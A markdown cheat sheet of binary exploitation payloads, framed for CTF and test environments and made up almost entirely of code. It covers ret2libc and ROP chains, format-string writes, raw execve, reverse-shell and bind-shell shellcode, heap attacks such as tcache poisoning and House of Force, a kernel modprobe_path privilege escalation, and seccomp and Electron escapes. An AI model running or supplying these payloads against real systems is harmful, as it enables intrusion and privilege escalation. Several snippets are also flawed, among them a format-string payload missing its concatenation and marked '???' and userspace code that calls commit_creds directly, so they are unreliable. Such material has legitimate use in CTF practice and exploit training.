# Binary Exploitation Payloads

A collection of working payloads for binary exploitation security testing. Organized by exploitation technique. All payloads are functional against test/CTF environments.

---

## Buffer Overflow

### Linux x86-64 ROP Chain

```python
# Basic ret2libc pattern
from pwn import *

# Offset discovery
padding = cyclic(100)
# Pattern offset: AAAABAAACAAADAAAEAAAFAAAGAAAHAAAIAAAJAAAKAAALAAAMAAANAAAOAAAPAAAQAAARAAAS...

# ret2libc payload structure
payload = flat(
    b'A' * offset,           # Padding to RIP
    p64(pop_rdi),             # pop rdi; ret
    p64(next(bin_sh, 0)),     # "/bin/sh" address
    p64(ret),                 # Stack alignment (movaps)
    p64(system_addr),         # system() address
)
```

### ret2system (32-bit)

```bash
# Pattern: [padding] + [system] + [return_after_system] + [/bin/sh]

# Using pwntools:
python3 -c "
from pwn import *
padding = b'A' * 140
system_addr = p32(0xf7e05070)
bin_sh_addr = p32(0xf7f4f00a)
ret_addr = p32(0xdeadbeef)

payload = padding + system_addr + ret_addr + bin_sh_addr
print(payload.decode('latin-1'))
"
```

### ret2libc (64-bit) - Full Chain

```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Leak LIBC via puts@plt
pop_rdi = 0x401283  # pop rdi; ret
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

# Stage 1: leak libc address
payload1 = flat(
    b'A' * offset,
    p64(pop_rdi),
    p64(puts_got),
    p64(puts_plt),
    p64(main_addr)    # return to main for stage 2
)

# Stage 2: call system("/bin/sh")
libc.address = leaked_libc - libc.symbols['puts']
payload2 = flat(
    b'A' * offset,
    p64(pop_rdi + 1),     # ret for stack alignment
    p64(pop_rdi),
    p64(next(libc.search(b'/bin/sh'))),
    p64(libc.symbols['system']),
)
```

---

## Format String

### Leak Memory

```python
# Leak stack values
# %p  - pointer
# %x  - hex
# %s  - string (dereference address)
# %n  - write (DANGEROUS)

# Positional parameters
'%p.%p.%p.%p.%p.%p.%p.%p'
'%1$p.%2$p.%3$p.%4$p.%5$p'

# Leak specific stack offset
'%6$s'  # dereference value at offset 6 as string

# Leak program base
'%13$p'  # often a return address -> calculate base
```

### Write with Format String

```python
# Write arbitrary value to arbitrary address
# %n writes number of bytes output so far

# Write to a specific address (32-bit):
payload = flat(
    p32(target_addr),      # address to write to
    b'%10$n'               # write to address at offset 10
)

# Multiple writes - craft value byte by byte
# Pattern for writing 0x12345678 to 0x804a040:
payload = (
    p32(0x804a040)       # lowest byte (0x78 = 120 decimal)
    p32(0x804a041)       # next byte  (0x56 = 86)
    p32(0x804a042)       # next byte  (0x34 = 52)
    p32(0x804a043)       # highest    (0x12 = 18)
    b'%120c%10$hhn'      # write 120 = 0x78
    b'%206c%11$hhn'      # write 326-120 = 206 = 0x146 -> 0x56 (byte wrap)
    b'%62c%12$hhn'       # write 388-326 = 62 = 0x3e -> 0x34 after wrap???
)
```

---

## Shellcode

### Linux x86-64 execve("/bin/sh")

```python
# 27-byte standard shellcode
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# Alternative: execve("/bin/sh", NULL, NULL)
from pwn import *
shellcode = asm(shellcraft.sh())
```

### Linux x86 (32-bit) execve("/bin/sh")

```python
# 23-byte standard shellcode
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

from pwn import *
context.arch = 'i386'
shellcode = asm(shellcraft.sh())
```

### Reverse Shell Shellcode

```python
# Linux x86-64 reverse shell (connect to 127.0.0.1:4444)
from pwn import *
context.arch = 'amd64'
shellcode = asm(shellcraft.connect('127.0.0.1', 4444) + shellcraft.sh())

# Custom parameters
ip = '127.0.0.1'
port = 4444
shellcode = asm(shellcraft.reverse_connect(ip, port))
```

### Bind Shell Shellcode

```python
# Linux x86-64 bind shell on port 4444
from pwn import *
context.arch = 'amd64'
shellcode = asm(shellcraft.bindsh(4444))
```

### Stage Shellcode (Egg Hunter)

```python
# Search for egg (0x50905090) in memory
from pwn import *
context.arch = 'amd64'

egghunter = asm("""
    xor    rdi, rdi
    or     dx, 0xfff
loop:
    inc    rdx
    push   0x67
    pop    rax
    syscall
    cmp    al, 0xf2
    je     loop
    mov    eax, 0x50905090
    mov    rdi, rdx
    scasd
    jne    loop
    scasd
    jne    loop
    jmp    rdi
""")
```

---

## Return-Oriented Programming (ROP)

### ret2csu (x86-64 Universal Gadget)

```python
# __libc_csu_init universal gadget for calling functions with 3 args
# When no pop rdi/rdi/rsi/rsi gadgets available

from pwn import *
elf = ELF('./vuln')

# __libc_csu_init gadgets:
csu_pop = 0x40123a  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_call = 0x401220 # mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]

payload = flat(
    b'A' * offset,
    p64(csu_pop),
    p64(0),            # rbx = 0
    p64(1),            # rbp = 1
    p64(target_func),  # r12 -> edi (arg1)
    p64(arg2_addr),    # r13 -> rsi (arg2)
    p64(arg3_addr),    # r14 -> rdx (arg3)
    p64(got_entry),    # r15 -> call [r15] (must point to function pointer)
    p64(csu_call),
    # after call: add rbx, 1; cmp rbx, rbp; jne ...
    p64(0) * 7,        # clear registers
    p64(main_func),    # return to main
)
```

### SROP (Sigreturn-Oriented Programming)

```python
# x86-64 SROP when sigreturn gadget is available

from pwn import *
context.arch = 'amd64'

sigreturn_addr = 0x401234  # syscall; ret gadget
syscall_addr = 0x401236

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

payload = flat(
    b'A' * offset,
    p64(sigreturn_addr),
    bytes(frame)
)
```

### Ret2dlresolve (No Leak Required)

```python
# x86 (32-bit) resolve arbitrary function without leaking libc
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# Build fake relocation entry + symbol + string table entries
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

payload = flat({offset: rop.chain()}) + b'A' * (100 - len(rop.chain()))
payload += dlresolve.payload
```

---

## Heap Exploitation

### Use-After-Free (UAF)

```python
from pwn import *

# Trigger UAF to get arbitrary read/write
# 1. Allocate chunk A
alloc(0, 0x80, b'A' * 8)

# 2. Free chunk A (pointer not nulled)
free(0)

# 3. Allocate overlapping chunk B (reuses A's memory)
alloc(1, 0x80, b'B' * 8)

# 4. Read freed pointer A -> leaks B's data
leak = read(0)

# 5. Write to freed pointer -> overwrites B
write(0, p64(target_addr))
```

### tcache Poisoning (glibc 2.26+)

```python
from pwn import *

# Step 1: Free two chunks into tcache
free(0)  # -> tcache bin
free(1)  # -> tcache bin (head)

# Step 2: Overwrite tcache freelist pointer (via UAF or overflow)
write(1, p64(target_addr))  # tcache->next = target_addr

# Step 3: Allocate twice - second allocation returns target_addr
alloc(2, 0x40, b'/bin/sh\x00')  # pops chunk 1
alloc(3, 0x40, p64(libc.system)) # writes to target_addr
```

### Fastbin Attack (glibc < 2.26)

```python
from pwn import *

# Tcache disabled, using fastbins
# Step 1: Overflow/inject fd pointer
payload = flat(
    b'A' * padding,
    p64(0x71),                # fake size
    p64(target_addr - 0x10),  # fd -> target (with size at offset)
)

# Step 2: Trigger malloc to return controlled address
malloc(0x68)  # returns target_addr

# Step 3: Write to controlled address
write_to_target(p64(win_addr))
```

### House of Force (glibc < 2.29)

```python
from pwn import *

# Exploit top chunk size for arbitrary allocation
# 1. Overwrite top chunk size with -1 (no size check)

# 2. Calculate size to allocate chunk at target
target = 0x601040  # GOT entry
malloc_size = (target - 0x10) - (top_chunk_addr) - 0x20

malloc(malloc_size)  # consume top chunk space

# 3. Next malloc returns chunk at target
malloc(0x100, p64(shell_addr))  # overwrites GOT
```

### Unsorted Bin Attack (glibc < 2.29)

```python
from pwn import *

# Write libc address to arbitrary location
# 1. Overflow freed unsorted bin chunk's bk pointer
payload = flat(
    b'A' * padding,
    p64(0),               # prev_size
    p64(0x91),            # size (UNSORTED_BIN)
    p64(0),               # fd (null from unsorted)
    p64(target_addr - 0x10)  # bk -> target
)

# 2. Trigger allocation from unsorted bin -> writes main_arena to target
malloc(0x88)
```

---

## Kernel Exploitation

### modprobe_path

```bash
# Classic kernel LPE via modprobe_path overwrite (kernel < 5.x)
# 1. Get arbitrary write (e.g., via UAF in kernel module)
# 2. Overwrite /proc/sys/kernel/modprobe_path to point to your script

# modprobe_path address (find in /proc/kallsyms or via infoleak)
write_to_kernel(modprobe_path_addr, b'/tmp/exploit.sh\x00')

# 3. Write exploit script
echo '#!/bin/sh' > /tmp/exploit.sh
echo 'chmod 777 /flag' >> /tmp/exploit.sh
chmod +x /tmp/exploit.sh

# 4. Trigger modprobe_path execution by running file with unknown binfmt
echo '\xff\xff\xff\xff' > /tmp/payload
chmod +x /tmp/payload
/tmp/payload  # triggers modprobe which runs /tmp/exploit.sh
```

### KASLR Bypass via dmesg

```bash
# If dmesg is accessible, kernel addresses can be leaked
dmesg | grep "Kernel image"   # get kernel base

# Alternative via /proc/kallsyms (if root or CAP_SYSLOG)
cat /proc/kallsyms | grep "startup_64"  # get kernel base

# Alternative via BPF info leak on older kernels
cat /proc/sys/kernel/kptr_restrict
# If 0 -> addresses visible, if 2 -> always hidden
```

### ioctl-based Exploitation Pattern

```c
// Kernel module exploitation pattern
// 1. Open device
int fd = open("/dev/vuln_dev", O_RDWR);

// 2. Leak kernel pointer via ioctl(READ_LEAK)
struct info data;
ioctl(fd, 0xdeadbeef, &data);
unsigned long kaslr_base = data.leak - known_offset;

// 3. Trigger heap overflow via ioctl(VULN_COPY)
struct exploit cmd;
cmd.size = 0x1000;  // trigger overflow
cmd.data = userspace_buf;
ioctl(fd, 0xcafebabe, &cmd);

// 4. Escalate privileges via overwritten cred structure
commit_creds(prepare_kernel_cred(0));
```

---

## Sandbox Escape

### Seccomp Bypass

```python
# Read flag even when execve/seccomp is blocking

from pwn import *

# Method 1: open + read + write (no execve needed)
shellcode = asm("""
    /* open("/flag", O_RDONLY) */
    mov rdi, 0x67616c662f  /* "/flag" */
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2   /* SYS_open */
    syscall

    /* read(fd, buf, 100) */
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    xor rax, rax  /* SYS_read */
    syscall

    /* write(1, buf, len) */
    mov rdx, rax
    mov rdi, 1
    mov rsi, rsp
    mov rax, 1  /* SYS_write */
    syscall
""")

# Method 2: ORW (open-read-write) shellcode
shellcode = asm(shellcraft.open('/flag', 0) + shellcraft.read('rax', 'rsp', 100) + shellcraft.write(1, 'rsp', 'rax'))
```

### Chrome/Electron Sandbox Escape

```bash
# Node.js flag read (Electron applications)
require('fs').readFileSync('/flag', 'utf8')
process.binding('fs').readfile('/flag')

# Electron shell escape
require('child_process').execSync('cat /flag').toString()
```

---

## ARM Exploitation

### ARM32 Shellcode

```python
from pwn import *
context.arch = 'arm'

# ARM execve("/bin/sh", NULL, NULL)
shellcode = asm("""
    adr r0, bin_sh
    mov r1, #0
    mov r2, #0
    mov r7, #11   /* SYS_execve */
    svc #0
bin_sh:
    .ascii "/bin/sh\\x00"
""")
```

### ARM64 Shellcode

```python
from pwn import *
context.arch = 'aarch64'

shellcode = asm("""
    adr x0, bin_sh
    mov x1, #0
    mov x2, #0
    mov x8, #221  /* SYS_execve on aarch64 */
    svc #0
bin_sh:
    .ascii "/bin/sh\\x00"
""")
```

### ARM ROP

```python
from pwn import *
context.arch = 'arm'

# ARM stack pivot (load sp from controlled location)
# Gadget: ldmfd sp!, {regs...}
payload = flat(
    b'A' * offset,
    p32(gadget_pop_pc),      # pop {pc}
    p32(stack_spray_addr),   # controlled PC
)

# ret2libc on ARM
payload = flat(
    b'A' * offset,
    p32(pop_r0_r4_pc),      # pop {r0, r4, pc}
    p32(bin_sh_addr),       # r0 = "/bin/sh"
    p32(0xdeadbeef),         # r4 = junk
    p32(system_addr),        # pc = system()
)
```
